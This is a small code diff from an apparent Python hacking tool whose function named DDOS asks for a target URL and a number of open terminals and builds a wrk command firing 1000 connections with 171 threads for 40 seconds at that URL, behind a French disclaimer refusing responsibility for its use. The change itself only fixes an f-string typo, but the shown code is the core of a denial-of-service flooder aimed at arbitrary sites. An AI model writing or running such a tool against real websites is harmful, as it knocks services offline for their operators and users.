@@ -4,7 +4,7 @@ import os
 from .Colors import *
 
 def DDOS():
-    print("f{Colors.RED} Je ne suis pas responsable de ce que vous faites avec cette outils{Colors.RESET}")
+    print(f"{Colors.RED} Je ne suis pas responsable de ce que vous faites avec cette outils{Colors.RESET}")
     nb = input("Quelle est le nombre de terminal ouvert? ")
     URL = input("URL? (avec http.s): ")
     cmd = f"wrk -t171 -c1000 -d40 {URL}"
